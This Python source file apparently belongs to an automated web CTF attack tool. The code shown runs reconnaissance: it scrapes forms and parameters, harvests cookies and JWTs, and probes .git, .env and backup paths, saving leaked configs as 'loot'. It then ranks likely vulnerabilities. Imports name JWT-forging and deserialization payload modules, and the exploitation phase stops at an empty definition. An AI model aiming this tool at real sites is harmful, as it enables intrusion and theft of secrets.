"""
Autonomous 7-Phase Web CTF Offensive Pipeline with Persistent Memory & Adaptive Learning.
Executes Recon, Statistical Analysis, Threat Modeling, Active Exploitation,
Privilege Escalation, Post-Exploitation, and Multi-Flag Hunting.
"""

import re
import os
import io
import itertools
import time
import json
import base64
import random
import requests
from PIL import Image
from urllib.parse import urljoin, urlparse, parse_qs
from typing import List, Dict, Any, Optional, Tuple



from core.ui import (
    console, print_header, print_success, print_info,
    print_warning, print_error, print_flag, print_table, print_code
)
from core.utils import find_flags, create_session
from core.memory import LearningEngine, SessionStorage, LootManager
from modules.scanner import scan_target, extract_forms_and_links, fingerprint_tech
from modules.encoder import decode_all, auto_smart_decode
from modules.ssti import get_all_ssti_engines, DETECTION_PAYLOADS
from modules.jwt_tool import decode_jwt, forge_alg_none, sign_jwt_hs256, bruteforce_secret
from modules.cheatsheet import analyze_code_snippet, PHP_QUIRKS
from modules.response_analyzer import ResponseAnalyzer
from modules.bypass_engine import BypassEngine
from modules.chaining_engine import VulnerabilityChainEngine
from modules.container_escape import ContainerEscapeAdvisor
from modules.deserializer import (
    generate_pickle_payload, generate_pyyaml_payload,
    generate_nodejs_serialize_payload, generate_php_serialized_object
)
from modules.client_side import ClientSideAnalyzer
from modules.php_tricks import PHPTricksEngine
from modules.eval_injection import EvalInjectionEngine
from modules.nosql_injection import NoSQLInjectionEngine
from modules.reasoning_engine import ReasoningEngine
from modules.intelligence_engine import IntelligenceEngine
from modules.ctf_reasoner import CTFReasoner




class AutoPwnPipeline:
    """
    7-Phase Enterprise Web CTF Autonomous Exploit Engine.
    """
    def __init__(self, target_url: str, step_by_step: bool = False, custom_flag_prefix: Optional[str] = None):
        self.target_url = target_url.strip()
        self.step_by_step = step_by_step
        self.flag_prefix = custom_flag_prefix
        self.session = create_session()
        self.learning_engine = LearningEngine()
        
        # State tracking across all 7 phases
        self.state = {
            "target_url": self.target_url,
            "tech_stack": [],
            "endpoints": set(),
            "forms": [],
            "parameters": set(),
            "comments": [],
            "sensitive_hits": [],
            "cookies": {},
            "jwt_tokens": [],
            "scripts": set(),
            "inline_scripts": [],
            "leaked_source_files": {}, # filename -> content
            "leaked_secrets": {},      # key -> value
            "vulnerabilities": [],     # list of discovered flaws
            "priv_esc_vectors": [],
            "captured_flags": set(),
            "attack_steps": [],        # list of step descriptions
            "curl_commands": [],
            "active_rce_method": None  # function/lambda to execute system commands
        }

    def _log_step(self, phase_name: str, description: str, details: str = "", curl_cmd: str = ""):
        """Record an attack step in the Attack Graph."""
        step_entry = {
            "phase": phase_name,
            "description": description,
            "details": details,
            "timestamp": time.strftime("%H:%M:%S")
        }
        self.state["attack_steps"].append(step_entry)
        if curl_cmd:
            self.state["curl_commands"].append(curl_cmd)

    def _check_and_store_flags(self, text: str, source_context: str = ""):
        """Scan text for CTF flags, print victory panel, and store in state.
        Returns True if at least one new flag was captured."""
        found = find_flags(text, self.flag_prefix)
        captured_any = False
        if found:
            for f in set(found):
                if f not in self.state["captured_flags"]:
                    self.state["captured_flags"].add(f)
                    print_flag(f)
                    self._log_step("Phase 7: Flag Capture", f"Captured flag from {source_context}: {f}")
                    captured_any = True
        return captured_any

    def _follow_hidden_forms(self, html: str, base_url: str, source_context: str = ""):
        """Parse HTML for hidden forms and JS-set input values, then submit them.
        Handles multi-step auth flows like: login.php returns hidden form posting hash to admin.php."""
        hidden_forms = re.findall(
            r'<form[^>]*action=["\']([^"\']+)["\'][^>]*>(.*?)</form>',
            html, re.IGNORECASE | re.DOTALL
        )
        for hf_action, hf_body in hidden_forms:
            hf_inputs = {}
            for hf_inp in re.finditer(
                r'<input[^>]*name=["\']([^"\']+)["\'][^>]*>', hf_body, re.IGNORECASE
            ):
                inp_tag = hf_inp.group(0)
                inp_name = hf_inp.group(1)
                val_match = re.search(r'value=["\']([^"\']*)["\']', inp_tag, re.IGNORECASE)
                hf_inputs[inp_name] = val_match.group(1) if val_match else ""

            # Extract values set via JS (e.g., document.getElementById('x').value = "hash")
            for js_val in re.finditer(
                r'getElementById\s*\(\s*["\']([^"\']+)["\']\s*\)\s*\.value\s*=\s*["\']([^"\']+)["\']',
                html, re.IGNORECASE
            ):
                elem_id = js_val.group(1)
                elem_val = js_val.group(2)
                # Match element ID to input name in the form
                for hf_inp2 in re.finditer(
                    r'<input[^>]*id=["\']' + re.escape(elem_id) + r'["\'][^>]*>',
                    hf_body, re.IGNORECASE
                ):
                    name_match = re.search(r'name=["\']([^"\']+)["\']', hf_inp2.group(0), re.IGNORECASE)
                    if name_match:
                        hf_inputs[name_match.group(1)] = elem_val

            if hf_inputs:
                hf_full_url = urljoin(base_url, hf_action)
                try:
                    r_hf = self.session.post(hf_full_url, data=hf_inputs, timeout=15)
                    self._check_and_store_flags(r_hf.text, f"Hidden Form Follow-up ({hf_full_url}) via {source_context}")
                    if r_hf.status_code in (301, 302):
                        loc = r_hf.headers.get("Location", "")
                        if loc:
                            r_hf2 = self.session.get(urljoin(hf_full_url, loc), timeout=15)
                            self._check_and_store_flags(r_hf2.text, f"Hidden Form Redirect ({loc})")
                except Exception:
                    pass

    def run(self):
        """Execute the complete 7-Phase Offensive Pipeline."""
        console.print(f"\n[bold magenta]══════════════════════════════════════════════════════════════════════════════[/bold magenta]")
        console.print(f"[bold yellow]  ►► STARTING 7-PHASE AUTONOMOUS OFFENSIVE PIPELINE ◄◄[/bold yellow]")
        console.print(f"[bold cyan]  Target Challenge URL: [/bold cyan][bold white]{self.target_url}[/bold white]")
        console.print(f"[bold magenta]══════════════════════════════════════════════════════════════════════════════[/bold magenta]\n")

        try:
            # Phase 1: Information Gathering & Reconnaissance
            self.phase1_reconnaissance()

            # Phase 2: Scanning & Statistical Analysis
            self.phase2_statistical_analysis()

            # Phase 3: Vulnerability Analysis & Threat Modeling
            self.phase3_threat_modeling()

            # Phase 4: Active Exploitation
            self.phase4_active_exploitation()

            # Phase 5: Privilege Escalation
            self.phase5_privilege_escalation()

            # Phase 6: Post-Exploitation & Persistence
            self.phase6_post_exploitation()

            # Phase 7: Multi-Flag Hunting & Victory Reporting
            self.phase7_multi_flag_hunting()

        except KeyboardInterrupt:
            print_warning("\nPipeline paused by user. Saving current session state...")

        # Final Persistence & Memory Update
        self._save_session_and_loot()

    # =========================================================================
    # PHASE 1: جمع المعلومات والاستطلاع (Information Gathering & Reconnaissance)
    # =========================================================================
    def phase1_reconnaissance(self):
        print_header("المرحلة 1: جمع المعلومات والاستطلاع", "Phase 1: Deep Recon & Asset Scraping")
        
        # 1. Fetch Root Page
        try:
            r = self.session.get(self.target_url, timeout=15)
            self.state["endpoints"].add(self.target_url)
            self.state["baseline_html"] = r.text
            self._check_and_store_flags(r.text, "Root Web Page")
            
            # Extract headers & cookies
            headers_dict = dict(r.headers)
            cookies_dict = r.cookies.get_dict()
            self.state["cookies"].update(cookies_dict)

            
            # Check JWT in cookies
            for cname, cval in cookies_dict.items():
                if cval.count(".") == 2:
                    self.state["jwt_tokens"].append((cname, cval))
                    print_info(f"Detected JWT Token in cookie '[bold cyan]{cname}[/bold cyan]'")

            # Tech fingerprinting
            self.state["tech_stack"] = fingerprint_tech(headers_dict, r.text, cookies_dict)
            print_success(f"Fingerprinted Technologies: {', '.join(self.state['tech_stack']) or 'Standard Web'}")

            # 2. Extract HTML Comments & Inline Secrets
            comments = re.findall(r"<!--(.*?)-->", r.text, re.DOTALL)
            for c in comments:
                c_clean = c.strip()
                if c_clean:
                    self.state["comments"].append(c_clean)
                    self._check_and_store_flags(c_clean, "HTML Comment")
            if self.state["comments"]:
                print_info(f"Extracted {len(self.state['comments'])} HTML Comments.")

            # 3. Deep Link & Form Parsing
            parsed = extract_forms_and_links(r.text, self.target_url)
            for l in parsed["links"]:
                self.state["endpoints"].add(l)
            for p in parsed["parameters"]:
                self.state["parameters"].add(p)
            for s in parsed.get("scripts", []):
                self.state["scripts"].add(s)
            self.state["inline_scripts"].extend(parsed.get("inline_scripts", []))
            self.state["forms"].extend(parsed["forms"])

            # Extract parameters directly from the target URL query string
            from urllib.parse import urlparse, parse_qs
            qs = parse_qs(urlparse(self.target_url).query)
            for p in qs:
                self.state["parameters"].add(p)

            print_info(f"Discovered [bold green]{len(self.state['endpoints'])}[/bold green] Endpoints, [bold green]{len(self.state['forms'])}[/bold green] Forms, [bold green]{len(self.state['scripts'])}[/bold green] Scripts, [bold green]{len(self.state['parameters'])}[/bold green] Input Parameters.")

            # 4. Dummy Data Harvest (Form Interaction)
            self._harvest_form_cookies()

        except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
            print_error(f"Failed to connect to target URL: {e}")
            return


        # 4. Probe CTF Sensitive Paths (.git, .env, backups, etc.)
        print_info("Probing CTF source leaks (.git, .env, backups, Dockerfile)...")
        hits = scan_target(self.target_url, max_workers=8, flag_prefix=self.flag_prefix)
        self.state["sensitive_hits"] = hits
        
        for h in hits:
            if h["status"] == 200:
                print_success(f"Sensitive Asset Found: [bold yellow]{h['path']}[/bold yellow] (Size: {h['length']} bytes)")
                self._log_step("Phase 1: Recon", f"Discovered sensitive file: {h['path']}", curl_cmd=f"curl -s {h['url']}")
                # If .env or config file leaked, save to loot
                if any(x in h["path"] for x in [".env", "config", "app.py", "backup", "flag"]):
                    try:
                        content = self.session.get(h["url"], timeout=15).text
                        LootManager.save_source_file(self.target_url, h["path"], content)
                        self._check_and_store_flags(content, h["path"])
                    except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
                        pass  # TODO: Handle specific exceptions like requests.exceptions.RequestException
                        pass

    # =========================================================================
    # PHASE 1b: Dummy Data Harvest
    # =========================================================================
    def _harvest_form_cookies(self):
        """Submit dummy data to all discovered forms to harvest hidden cookies (like JWTs)."""
        forms = self.state.get("forms", [])
        if not forms:
            return

        print_info(f"Initiating Dummy Data Harvest on {len(forms)} forms to uncover hidden state/cookies...")
        for f in forms:
            action = f.get("action", self.target_url)
            method = f.get("method", "GET").upper()
            inputs = f.get("inputs", [])
            
            # Prepare dummy payload
            payload = {}
            for i in inputs:
                name = i.get("name")
                if not name:
                    continue
                itype = i.get("type", "text")
                if itype == "email":
                    payload[name] = "test@example.com"
                elif itype == "password":
                    payload[name] = "password"
                elif itype == "number":
                    payload[name] = "1"
                else:
                    payload[name] = "testuser"

            # Submit dummy data
            try:
                if method == "POST":
                    r = self.session.post(action, data=payload, timeout=15, allow_redirects=False)
                else:
                    r = self.session.get(action, params=payload, timeout=15, allow_redirects=False)
                
                # Check for new cookies!
                new_cookies = r.cookies.get_dict()
                if new_cookies:
                    added = {k: v for k, v in new_cookies.items() if k not in self.state["cookies"]}
                    if added:
                        print_success(f"  -> Harvested NEW Cookies from form submission: {', '.join(added.keys())}")
                        self.state["cookies"].update(added)
                        # Immediately check if we found a JWT
                        for cname, cval in added.items():
                            if cval.count(".") == 2:
                                self.state["jwt_tokens"].append((cname, cval))
                                print_success(f"  -> [bold cyan]JWT Token Harvested![/bold cyan] ({cname})")
            except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
                pass  # TODO: Handle specific exceptions like requests.exceptions.RequestException
                pass


    # =========================================================================
    # PHASE 2: الفحص والتحليل الإحصائي (Scanning & Statistical Analysis)
    # =========================================================================
    def phase2_statistical_analysis(self):
        print_header("المرحلة 2: الفحص والتحليل الإحصائي", "Phase 2: Statistical & Response Profiling")
        
        # 1. Baseline Response Measurement & Semantic Diagnostic Check
        try:
            t0 = time.time()
            base_resp = self.session.get(self.target_url, timeout=15)
            base_time = time.time() - t0
            base_len = len(base_resp.content)
            print_info(f"Baseline Profile: Status {base_resp.status_code} | Length: {base_len} bytes | Latency: {base_time:.2f}s")
            
            # Semantic response diagnostic
            diag = ResponseAnalyzer.analyze_response(base_resp.text, base_resp.status_code, dict(base_resp.headers))
            summary = ResponseAnalyzer.format_diagnostic_summary(diag)
            if summary:
                console.print(summary)
            if diag["leaked_paths"]:
                self.state["sensitive_hits"].extend([{"path": p, "status": 200, "length": 0, "url": self.target_url} for p in diag["leaked_paths"]])
        except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
            pass  # TODO: Handle specific exceptions like requests.exceptions.RequestException
            pass

        # 2. Parameter Reflection Context Check
        canary = "ctf_canary_8819"
        reflected_params = []
        for param in list(self.state["parameters"])[:6]:
            try:
                test_url = f"{self.target_url}?{param}={canary}"
                r = self.session.get(test_url, timeout=15)
                if canary in r.text:
                    reflected_params.append(param)
            except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
                pass  # TODO: Handle specific exceptions like requests.exceptions.RequestException
                pass

        if reflected_params:
            print_success(f"Reflected Input Parameters Detected: {', '.join(reflected_params)}")
            self._log_step("Phase 2: Analysis", f"Parameters reflecting input: {reflected_params}")
        # Store for later phases (predictive ranking in Phase 3b)
        self.state["reflected_params"] = reflected_params

        # 3. JWT Inspection
        for cname, token in self.state["jwt_tokens"]:
            decoded = decode_jwt(token)
            if decoded:
                print_info(f"JWT Header: {decoded.get('header')} | Claims: {decoded.get('payload')}")
                self._log_step("Phase 2: Analysis", f"JWT token inspected on cookie {cname}")

    # =========================================================================
    # PHASE 3: تحليل الثغرات والنمذجة (Vulnerability Analysis & Threat Modeling)
    # =========================================================================
    def phase3_threat_modeling(self):
        print_header("المرحلة 3: تحليل الثغرات والنمذجة", "Phase 3: Attack Surface & Threat Modeling")
        
        attack_surface = []
        
        # Classify parameters
        for p in self.state["parameters"]:
            pl = p.lower()
            if any(k in pl for k in ["file", "page", "include", "view", "path", "doc", "template"]):
                attack_surface.append(("High", "LFI / Path Traversal / SSTI", f"Param: {p}"))
            elif any(k in pl for k in ["cmd", "ip", "host", "ping", "exec", "query", "run"]):
                attack_surface.append(("Critical", "Command Injection", f"Param: {p}"))
            elif any(k in pl for k in ["id", "user", "name", "search", "q", "category"]):
                attack_surface.append(("High", "SQL Injection / SSTI", f"Param: {p}"))
            elif any(k in pl for k in ["url", "link", "redirect", "src", "fetch"]):
                attack_surface.append(("High", "SSRF / Open Redirect", f"Param: {p}"))

        # Forms
        for f in self.state["forms"]:
            action = f["action"]
            input_names = [i["name"] for i in f["inputs"]]
            if any("pass" in n.lower() for n in input_names):
                attack_surface.append(("Critical", "Authentication Bypass / SQLi / Type Juggling", f"Form: {action}"))
            elif any(i.get("type") == "file" for i in f["inputs"]):
                attack_surface.append(("Critical", "Arbitrary File Upload / Webshell", f"Upload Form: {action}"))

        if self.state["jwt_tokens"]:
            attack_surface.append(("Critical", "JWT None Alg / Secret Brute Force", "Cookie Tokens"))

        if attack_surface:
            print_table(
                ["Priority", "Vulnerability Class", "Target Surface Vector"],
                [[p, v, s] for p, v, s in attack_surface],
                title="Threat Modeling Attack Vectors"
            )
        else:
            print_info("Standard attack surface mapped across discovered endpoints.")

        # ── Deep Reasoning Integration ─────────────────────────────────────
        # Run the hypothesis-driven reasoning engine to generate offensive
        # hypotheses, correlate evidence, and build a multi-step attack plan
        # for complex challenges that static payload lists cannot handle.
        print_info("Running Deep Reasoning Engine for complex challenge analysis...")
        try:
            reasoning = ReasoningEngine(self.target_url, session=self.session, state=self.state)
            reasoning_report = reasoning.run_full_reasoning()

            # Store reasoning results in pipeline state for later phases
            self.state["reasoning_hypotheses"] = reasoning_report["hypotheses"]
            self.state["reasoning_correlations"] = reasoning_report["correlations"]
            self.state["reasoning_plan"] = reasoning_report["attack_plan"]
            self.state["reasoning_logic_findings"] = reasoning_report["logic_findings"]

            # Log reasoning steps into the attack graph
            for h in reasoning_report["hypotheses"][:5]:
                self._log_step(
                    "Phase 3: Deep Reasoning",
                    f"Hypothesis: {h['title']} (confidence {h['confidence']*100:.0f}%)",
                    details="; ".join(h["evidence"][:2])
                )
            for f in reasoning_report["logic_findings"]:
                self._log_step(
                    "Phase 3: Deep Reasoning",
                    f"Logic Flaw Confirmed: {f['title']}",
                    details=f.get("evidence", "")
                )
        except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
            print_warning(f"Deep reasoning engine encountered an issue: {e}")

        # ── CTF Logical Reasoner (Phase 3d) ─────────────────────────────
        # Human-like reasoning: observe -> hypothesize -> test.
        # This engine UNDERSTANDS the application's logic instead of
        # blindly firing static payloads. It analyzes cookies, headers,
        # and behavior to form testable theories about the challenge.
        print_info("Running CTF Logical Reasoner (human-like analysis)...")
        try:
            self.ctf_reasoner = CTFReasoner(self.target_url, session=self.session, state=self.state)
            reasoner_report = self.ctf_reasoner.reason()

            # Store reasoner results in state for Phase 4
            self.state["ctf_observations"] = reasoner_report["observations"]
            self.state["ctf_hypotheses"] = reasoner_report["hypotheses"]
            self.state["ctf_test_results"] = reasoner_report["test_results"]
            self.state["ctf_confirmed"] = reasoner_report["confirmed"]

            # Log confirmed hypotheses into the attack graph
            for c in reasoner_report["confirmed"]:
                self._log_step(
                    "Phase 3d: Logical Reasoner",
                    f"CONFIRMED: {c['hypothesis']}",
                    details="; ".join(c["evidence"][:2])
                )
        except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
            print_warning(f"CTF Logical Reasoner encountered an issue: {e}")

        # ── Predictive Vulnerability Ranking (Phase 3b) ─────────────────
        # Use all recon evidence to predict the most likely vuln classes
        # BEFORE active exploitation, so Phase 4 prioritizes the best vectors.
        self._predict_vulnerabilities()

        # ── Intelligence Engine (Phase 3c) ──────────────────────────────
        # The "brain" that evaluates all findings, scores their importance,
        # filters out noise, and builds a prioritized attack order.
        print_info("Running Intelligence Engine to prioritize findings and filter noise...")
        try:
            self.intelligence = IntelligenceEngine(self.state, self.learning_engine)
            intelligence_report = self.intelligence.analyze()

            # Store intelligence results in state for Phase 4
            self.state["intelligence_report"] = intelligence_report
            self.state["attack_priority"] = intelligence_report["attack_priority"]
            self.state["ignore_list"] = intelligence_report["ignore_list"]

            # Print the priority report
            self.intelligence.print_priority_report()

            # Log intelligence decisions into the attack graph
            for item in intelligence_report["attack_priority"][:5]:
                self._log_step(
                    "Phase 3c: Intelligence",
                    f"Priority: {item['target']} ({item['vuln_class']}) - {item['reason']}",
                    details=f"Priority score: {item['priority']}/100"
                )

            # Log ignored endpoints
            ignore_count = len(intelligence_report["ignore_list"])
            if ignore_count:
                self._log_step(
                    "Phase 3c: Intelligence",
                    f"Filtered {ignore_count} low-value endpoints (noise)",
                    details=", ".join(e["endpoint"] for e in intelligence_report["ignore_list"][:5])
                )
        except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
            print_warning(f"Intelligence engine encountered an issue: {e}")
            self.intelligence = None

    # =========================================================================
    # PHASE 3b: التوقع الاستباقي للثغرات (Predictive Vulnerability Ranking)
    # =========================================================================
    def _predict_vulnerabilities(self):
        """
        Predict the most likely vulnerability classes BEFORE active exploitation,
        using all recon evidence gathered in Phases 1-3. Produces a ranked list
        of (vuln_class, confidence, evidence) and stores it in state so that
        Phase 4 can prioritize the most promising exploit vectors first.
        """
        print_info("Predicting likely vulnerability classes from recon evidence...")
        predictions = []  # list of (vuln_class, confidence, evidence)

        html = self.state.get("baseline_html", "")
        tech = [t.lower() for t in self.state.get("tech_stack", [])]
        params = list(self.state.get("parameters", []))
        forms = self.state.get("forms", [])
        endpoints = list(self.state.get("endpoints", []))
        leaked = " ".join(self.state.get("leaked_source_files", {}).values())
        all_source = html + " " + leaked
        cookies = self.state.get("cookies", {})
        jwt_tokens = self.state.get("jwt_tokens", [])
        reflected = self.state.get("reflected_params", [])
        sensitive_hits = self.state.get("sensitive_hits", [])

        # ── 1. Tech-stack driven predictions ─────────────────────────────
        if any("php" in t for t in tech):
            predictions.append(("php_tricks", 0.75, "PHP stack detected - type juggling / header spoofing likely"))
        if any("node" in t or "express" in t or "javascript" in t for t in tech):
            predictions.append(("nosql", 0.7, "Node.js/Express stack - NoSQL injection surface"))
        if any("python" in t or "flask" in t or "django" in t for t in tech):
            predictions.append(("ssti", 0.7, "Python web framework - SSTI likely"))
        if any("java" in t or "spring" in t for t in tech):
            predictions.append(("deserialization", 0.6, "Java stack - deserialization surface"))

        # ── 2. Parameter-name driven predictions ─────────────────────────
        for p in params:
            pl = p.lower()
            if any(k in pl for k in ["file", "page", "include", "view", "path", "doc", "template"]):
                predictions.append(("lfi", 0.85, f"Parameter '{p}' suggests file inclusion"))
            elif any(k in pl for k in ["cmd", "ip", "host", "ping", "exec", "run", "query"]):
                predictions.append(("cmd_injection", 0.85, f"Parameter '{p}' suggests command execution"))
            elif any(k in pl for k in ["id", "user", "name", "search", "q", "category", "username"]):
                predictions.append(("sqli", 0.7, f"Parameter '{p}' suggests SQL query surface"))
            elif any(k in pl for k in ["url", "link", "redirect", "src", "fetch", "media_uri"]):
                predictions.append(("ssrf", 0.8, f"Parameter '{p}' suggests URL fetching"))
                predictions.append(("open_redirect", 0.7, f"Parameter '{p}' suggests redirect surface"))
            elif any(k in pl for k in ["next", "return", "goto", "dest", "continue", "callback", "redirect_uri"]):
                predictions.append(("open_redirect", 0.85, f"Parameter '{p}' is a classic redirect parameter"))
            elif any(k in pl for k in ["id", "uid", "user_id", "account", "profile", "order", "file_id", "doc"]):
                predictions.append(("idor", 0.75, f"Parameter '{p}' suggests object reference (IDOR)"))

        # ── 2b. GraphQL endpoint detection ──────────────────────────────
        if any(any(k in ep.lower() for k in ["graphql", "gql", "query"]) for ep in endpoints):
            predictions.append(("graphql", 0.9, "GraphQL endpoint detected - introspection surface"))

        # ── 2c. LDAP / auth-form driven predictions ─────────────────────
        for f in forms:
            names = [i.get("name", "").lower() for i in f.get("inputs", [])]
            if any("pass" in n for n in names) and any("user" in n or "login" in n or "uid" in n for n in names):
                predictions.append(("ldap", 0.5, "Login form with uid/pass - possible LDAP backend"))

        # ── 2d. CORS / CRLF / CSRF surface detection ────────────────────
        if any("api" in ep.lower() for ep in endpoints):
            predictions.append(("cors", 0.6, "API endpoint detected - CORS misconfiguration surface"))
        if any("login" in ep.lower() or "auth" in ep.lower() for ep in endpoints):
            predictions.append(("csrf", 0.5, "Auth endpoint detected - CSRF surface"))
        if any("redirect" in ep.lower() or "logout" in ep.lower() for ep in endpoints):
            predictions.append(("crlf", 0.5, "Redirect/logout endpoint - CRLF injection surface"))
        if any("search" in ep.lower() or "filter" in ep.lower() for ep in endpoints):
            predictions.append(("hpp", 0.5, "Search/filter endpoint - HTTP Parameter Pollution surface"))

        # ── 2e. Race Condition / Web Cache / Smuggling / Mass Assignment / OAuth ──
        if any(any(k in ep.lower() for k in ["transfer", "redeem", "coupon", "balance", "register", "reset", "verify"]) for ep in endpoints):
            predictions.append(("race_condition", 0.7, "State-changing endpoint detected - race condition surface"))
        if any(any(k in ep.lower() for k in ["account", "profile", "user", "dashboard", "settings"]) for ep in endpoints):
            predictions.append(("web_cache", 0.6, "Dynamic endpoint detected - web cache deception surface"))
        if any("api" in ep.lower() for ep in endpoints):
            predictions.append(("mass_assignment", 0.6, "API endpoint detected - mass assignment surface"))
        if any(any(k in ep.lower() for k in ["oauth", "authorize", "callback"]) for ep in endpoints):
            predictions.append(("oauth", 0.8, "OAuth endpoint detected - redirect_uri bypass surface"))
        if any("login" in ep.lower() or "auth" in ep.lower() for ep in endpoints):
            predictions.append(("smuggling", 0.4, "Auth endpoint detected - request smuggling surface"))

        # ── 2f. DOM Clobbering (client-side JS) ─────────────────────────
        if self.state.get("inline_scripts") or self.state.get("scripts"):
            predictions.append(("dom_clobbering", 0.5, "Client-side JS detected - DOM clobbering surface"))

        # ── 2g. CSV / Clickjacking / DNS Rebinding / Zip Slip / Tabnabbing / CSS / SSI / XSLT / XS-Leak / LaTeX ──
        if any(any(k in ep.lower() for k in ["csv", "export", "download", "report"]) for ep in endpoints):
            predictions.append(("csv_injection", 0.7, "CSV export endpoint detected - formula injection surface"))
        if any(any(k in ep.lower() for k in ["action", "submit", "delete", "transfer", "settings"]) for ep in endpoints):
            predictions.append(("clickjacking", 0.6, "State-changing endpoint detected - clickjacking surface"))
        if any(any(k in ep.lower() for k in ["upload", "import", "extract", "archive"]) for ep in endpoints):
            predictions.append(("zip_slip", 0.7, "Archive upload endpoint detected - zip slip surface"))
        if any(any(k in ep.lower() for k in ["latex", "tex", "pdf", "render", "math"]) for ep in endpoints):
            predictions.append(("latex", 0.7, "LaTeX/PDF rendering endpoint detected - LaTeX injection surface"))
        if any(any(k in ep.lower() for k in ["xml", "xslt", "transform", "report"]) for ep in endpoints):
            predictions.append(("xslt", 0.6, "XML/XSLT processing endpoint detected - XSLT injection surface"))
        if any("shtml" in ep.lower() for ep in endpoints):
            predictions.append(("ssi", 0.7, ".shtml endpoint detected - SSI injection surface"))
        if any("api" in ep.lower() for ep in endpoints):
            predictions.append(("dns_rebinding", 0.5, "API endpoint detected - DNS rebinding surface"))
        if self.state.get("baseline_html"):
            predictions.append(("tabnabbing", 0.5, "HTML content detected - tabnabbing surface"))
            predictions.append(("css_injection", 0.4, "HTML content detected - CSS injection surface"))
            predictions.append(("xs_leak", 0.4, "HTML content detected - XS-Leak surface"))

        # ── 3. Reflection-driven predictions ─────────────────────────────
        if reflected:
            predictions.append(("xss", 0.8, f"Parameters reflect input: {', '.join(reflected)}"))
            predictions.append(("ssti", 0.6, "Reflected input may hit template engine"))

        # ── 4. Form-driven predictions ───────────────────────────────────
        for f in forms:
            names = [i.get("name", "").lower() for i in f.get("inputs", [])]
            if any("pass" in n for n in names):
                predictions.append(("auth_bypass", 0.8, "Login form detected - auth bypass / SQLi surface"))
            if any(i.get("type") == "file" for i in f.get("inputs", [])):
                predictions.append(("file_upload", 0.85, "File upload form detected - webshell surface"))
            if any(k in n for n in names for k in ["message", "comment", "post", "content", "text", "msg"]):
                predictions.append(("xss_to_admin", 0.7, "Message/comment form detected - stored XSS surface"))

        # ── 5. Admin-bot / report endpoint prediction ────────────────────
        has_report = any(any(k in ep.lower() for k in ["report", "contact", "admin", "bot", "visit"]) for ep in endpoints)
        if has_report:
            predictions.append(("xss_to_admin", 0.85, "Admin bot / report endpoint detected - XSS-to-admin likely"))

        # ── 6. JWT / cookie prediction ───────────────────────────────────
        if jwt_tokens:
            predictions.append(("jwt", 0.85, f"JWT token detected in cookie: {jwt_tokens[0][0]}"))
        if any("session" in c.lower() or "token" in c.lower() for c in cookies):
            predictions.append(("cookie_manipulation", 0.6, "Session/token cookie detected - manipulation surface"))

        # ── 6a. Parametric cookie prediction (name/id/cookie/user_id) ───
        # Detect cookies that look like parametric values (name, id, cookie, user_id)
        # which are common in picoCTF-style cookie brute-force challenges.
        parametric_cookies = [c for c in cookies if any(k in c.lower() for k in ["name", "id", "cookie", "user", "page", "index", "num"])]
        if parametric_cookies:
            predictions.append(("cookie_manipulation", 0.9, f"Parametric cookie detected: {', '.join(parametric_cookies)} - brute-force surface"))
        # Also detect /check or /search endpoints which often pair with cookie brute-force
        if any(any(k in ep.lower() for k in ["check", "search", "cookie"]) for ep in endpoints):
            predictions.append(("cookie_manipulation", 0.85, "Check/search endpoint detected - cookie brute-force surface"))

        # ── 6b. CBC Bit-Flip prediction (encrypted cookies) ─────────────
        # Detect cookies that are base64-encoded and contain high-entropy
        # (encrypted) data - likely CBC-encrypted JSON like picoCTF 'More Cookies'
        from base64 import b64decode as _b64d
        for cname, cval in cookies.items():
            if cname.lower() in ("session", "jwt", "token", "csrf", "flask"):
                continue
            try:
                _dec = _b64d(cval)
                # Encrypted data: high entropy, non-printable bytes
                if len(_dec) >= 16:
                    _printable = sum(1 for b in _dec if 32 <= b <= 126)
                    _ratio = _printable / len(_dec)
                    # If mostly non-printable -> encrypted -> CBC bit-flip candidate
                    if _ratio < 0.6:
                        predictions.append(("cbc_bitflip", 0.9, f"Encrypted cookie '{cname}' detected - CBC bit-flip attack surface"))
                        break
            except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
                pass  # TODO: Handle specific exceptions like requests.exceptions.RequestException
                continue

        # ── 7. Sensitive-file leak prediction ────────────────────────────
        if sensitive_hits:
            predictions.append(("source_leak", 0.9, f"{len(sensitive_hits)} sensitive files leaked - source analysis surface"))

        # ── 8. Leaked-source driven predictions ──────────────────────────
        if re.search(r"shell_exec\s*\(|system\s*\(|exec\s*\(|passthru\s*\(", all_source):
            predictions.append(("cmd_injection", 0.9, "Source reveals shell_exec/system - command injection"))
        if re.search(r"SELECT.*\$_(GET|POST|REQUEST)|query\s*\(\s*['\"].*\$", all_source, re.IGNORECASE):
            predictions.append(("sqli", 0.85, "Source reveals unsanitized SQL interpolation"))
        if re.search(r"eval\s*\(|exec\s*\(|Function\s*\(|child_process", all_source, re.IGNORECASE):
            predictions.append(("eval_injection", 0.8, "Source reveals eval()/exec() - code injection"))
        if re.search(r"pickle\.loads|yaml\.load|unserialize|JSON\.parse", all_source, re.IGNORECASE):
            predictions.append(("deserialization", 0.85, "Source reveals insecure deserialization sink"))

        # ── Aggregate: keep highest confidence per vuln class ────────────
        best = {}
        for vc, conf, ev in predictions:
            if vc not in best or conf > best[vc][0]:
                best[vc] = (conf, ev)
        ranked = sorted(best.items(), key=lambda kv: kv[1][0], reverse=True)

        # Store in state for Phase 4 prioritization
        self.state["predictions"] = [
            {"vuln_class": vc, "confidence": round(conf, 2), "evidence": ev}
            for vc, (conf, ev) in ranked
        ]

        if ranked:
            rows = [[vc, f"{conf*100:.0f}%", ev] for vc, (conf, ev) in ranked]
            print_table(["Predicted Vuln", "Confidence", "Evidence"], rows, title="Predictive Vulnerability Ranking (Pre-Exploitation)")
            for vc, (conf, ev) in ranked[:3]:
                self._log_step("Phase 3b: Prediction", f"Predicted {vc} ({conf*100:.0f}%) - {ev}")
        else:
            print_info("No strong vulnerability predictions from recon evidence.")

    # =========================================================================
    # PHASE 4: الاستغلال الفعلي (Active Exploitation)
    # =========================================================================

    def phase4_active_exploitation(self):
